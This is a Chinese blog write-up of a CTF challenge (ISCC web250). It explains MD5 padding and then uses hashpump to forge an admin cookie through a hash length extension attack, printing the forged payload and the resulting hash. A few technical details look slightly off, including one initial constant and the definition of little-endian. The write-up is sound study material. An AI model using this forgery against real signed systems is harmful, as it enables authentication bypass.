    <content type="text"><![CDATA[ISCC时间线好长，课业繁忙，江湖再见，告辞！ 五一假期在干嘛？相信有很多小伙伴（其实是大表哥）开始了ISCC之旅，不知道为了在这个“动态分数”机制环境下得到更多的分数，大家的肝还好不好呢？ 信息安全与对抗技术竞赛（ISCC：Information Security and Countermeasures Contest），于2004年首次举办，是教育部、工业和信息化部主办的第一个国家级信息安全技术竞赛，在做题的时候，有一道题很有趣，web250的hash长度拓展攻击，这个方法原理不难，在几年前已经出现了，在2009年，Thai Duong 与 Juliano Rizzo发布了ASP.NET的padding oracle攻击，同时还写了一篇关于Flickr API签名可伪造的paper，Flickr API签名这个漏洞，实际上用的是MD5 Length Extension Attack，钻研了一个多星期的各位大表哥写的文章以及hash加密的具体算法，我想谈谈自己理解，并且分享一份自己写的利用代码。 0x01 原理 首先先看一张图片这有一幅图，感觉能把核心思路与过程充分地体现出来，不过在此之前我们应该了解MD5加密的大体步骤：填充与使用上一次计算出来的幻值进行四轮运算。 我们输入一个需要加密的字符的时候，该算法会对字符串进行分组，每448位（bit）也就是56字节一组，当不足448位时需要进行补充，我们先说一下448位的来源。每一个进行四轮运算的字符串，长度为64字节也就是512位，其中有8个字节是记录信息的长度（长度的意思是信息是多少二进制位），那么容纳信息的就只要56字节。假设我们对一个10个字节（80bit）的字符串A进行填充至64字节第一步，需要查看该信息是否小于等于56字节，即length(A)%64&lt;=56?这里单位是以字节为单位。第二步，对不足56字节的字符串进行填充，那么对A来说需要填充46字节，规定第一个字节必须填充%80，其余的填充%00，那么A填充的内容为：1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00 这里面有45个%00填充完毕。随后我们需要填充摘要信息，也是信息的长度，A有10字节，也就是80bit，换算成16进制为0x50，那么后面需要填充的8个字节为：1%50%00%00%00%00%00%00%00 为什么不是%00%00%00%00%00%00%00%50呢？因为MD5是小端存储，也就是低地址存储高位字节。对于小端储存，比如0x1234=&gt;34120000(假设32位储存长度)。至此我们需要处理的64位数据已经构造成功，这时候需要上一次MD5运算得到的ABCD来作为本次MD5运算的初始序列ABCD。在这里我们解释一下初始序列，对于第一次运算来说会默认四个32位初始序列1234A=0x01234567B=0x89abcdefC=0xfedcba98D=0x7654321 它们被称为链接变量将上面四个变量分别赋值到a,b,c,d变量中然后进行主循环(四轮)，每一轮都很相似。第一轮进行16次操作。每次操作对a，b，c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向右环移一个不定的数，并加上a，b，c或d中之一。最后用该结果取代a，b，c或d中之一。这样新的链接变量诞生了，如果还需要进行加密，那么就作为下一次加密的初始序列，如果结束的话，那么就把a,b,c,d进行大端储存，并且在一块。 0x02 一道CTF题目 理论说完了，我们来看一下题目： 题目直接给了源代码，审计的题目比较好做走我们我们可以知道，如果enc($username) === $_COOKIE[‘verify’]那么就setcookie的verifty:为md5($key+’guest’)可以知道未知的secret是$key，但是我们从下一套语句可以知道，$key的length：setcookie(“len”, strlen($key), time()+606024*7);因此这个题目已经分析出来了 已知的是：123$key的lengthmd5($key+&apos;guest&apos;)$username里要有admin字串 那么第一步上bp抓包找一下需要的数据可以发现 verify=78cfc57d983b4a17e55828c001a3e781 len=46使用hashpump我们把12payload:guest%80%00%00%00%00%98%01%00%00%00%00%00%00adminverify：5f585093a7fe86971766c3d25c43d0eb 进行repeater成功拿到flag 0x03 扩展 对于hash长度拓展攻击，挺感兴趣的，之后看了很多资料，凭着自己的理解写了一个脚本，虽然写出来了，对md5加密的算法理解了，但是不知道这四轮参与运算的固定的16进制为什么是这几个，还是应该好好研究。对于这个的用法，我简单的说一下1python expliot.py 作为初始序列的md5值 最为第二轮md5运算的字符 上一次的md5运算前的padding的时候%80前面字符串的二进制位数 脚本我放在我的github里 0x04 后记 之前一直在他大神们托管在github里的项目，这是第一次使用github因为是在学习的时候写的这个利用脚本，注释挺多的。 推荐一篇很棒的文章 https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>hash长度扩展攻击</tag>
      </tags>
  </entry>
</search>
